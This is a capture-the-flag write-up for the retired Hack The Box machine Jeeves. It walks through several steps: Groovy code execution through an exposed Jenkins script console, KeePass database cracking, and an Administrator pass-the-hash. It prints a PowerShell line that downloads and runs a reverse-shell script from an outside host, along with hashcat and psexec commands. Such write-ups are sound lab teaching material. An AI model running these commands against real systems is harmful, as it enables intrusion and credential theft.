---
title: HTB Jeeves
slug: jeeves
lang: en
platform: Hack The Box
category: Jenkins Exploitation
headline: Unauthenticated Jenkins script console, KeePass cracking and Administrator pass-the-hash
difficulty: Retired
objective: Root / Administrator
date: 2025-10-31
tags: [Windows, Jenkins, KeePass, Pass the Hash, ADS]
---

# HTB Jeeves

## Executive Summary

Jeeves exposes a Jenkins instance on a high TCP port. The script console allows Groovy command execution, which is used to download and execute a PowerShell reverse shell.

## Initial Access

After directory discovery finds Jenkins, a new build item and the script console confirm command execution. A Nishang PowerShell payload gives a shell as `kohsuke`.

## Credential Recovery

Local enumeration reveals a KeePass database. The database is copied out over SMB, converted with `keepass2john`, and cracked with a wordlist to recover the master password.

## Privilege Escalation

The KeePass vault contains the Administrator NTLM hash. Pass-the-hash with `psexec.py` gives an Administrator shell. The final flag is hidden in an NTFS Alternate Data Stream and recovered with `more < hm.txt:root.txt`.

## Key Commands

```bash
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/rev.ps1')" """
```

```bash
keepass2john CEH.kdbx
```

```bash
hashcat -m 13400 <hash-file> /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```bash
psexec.py jeeves/Administrator@10.129.14.69 -hashes aad3b435b51404eeaad3b435b51404ee:<redacted-ntlm>
```

```bash
dir /r
```

```bash
more < hm.txt:root.txt
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20251031164449.png|jeeves evidence 01]]

![[Pasted image 20251031165851.png|jeeves evidence 02]]

![[Pasted image 20251031170003.png|jeeves evidence 03]]

![[Pasted image 20251031170259.png|jeeves evidence 04]]

![[Pasted image 20251031170929.png|jeeves evidence 05]]

![[Pasted image 20251031171120.png|jeeves evidence 06]]

![[Pasted image 20251031172409.png|jeeves evidence 07]]

![[Pasted image 20251031173619.png|jeeves evidence 08]]

![[Pasted image 20251031173640.png|jeeves evidence 09]]

![[Pasted image 20251031174151.png|jeeves evidence 10]]

![[Pasted image 20251031180102.png|jeeves evidence 11]]

![[Pasted image 20251031180359.png|jeeves evidence 12]]

![[Pasted image 20251031184514.png|jeeves evidence 13]]

![[Pasted image 20251031184806.png|jeeves evidence 14]]

![[Pasted image 20251031190702.png|jeeves evidence 15]]

![[Pasted image 20251031190759.png|jeeves evidence 16]]

![[Pasted image 20251031191430.png|jeeves evidence 17]]

![[Pasted image 20251108172650.png|jeeves evidence 18]]

![[Pasted image 20251108172811.png|jeeves evidence 19]]

![[Pasted image 20251108172918.png|jeeves evidence 20]]

![[Pasted image 20251108173157.png|jeeves evidence 21]]

![[Pasted image 20251108173556.png|jeeves evidence 22]]

![[Pasted image 20251108174032.png|jeeves evidence 23]]
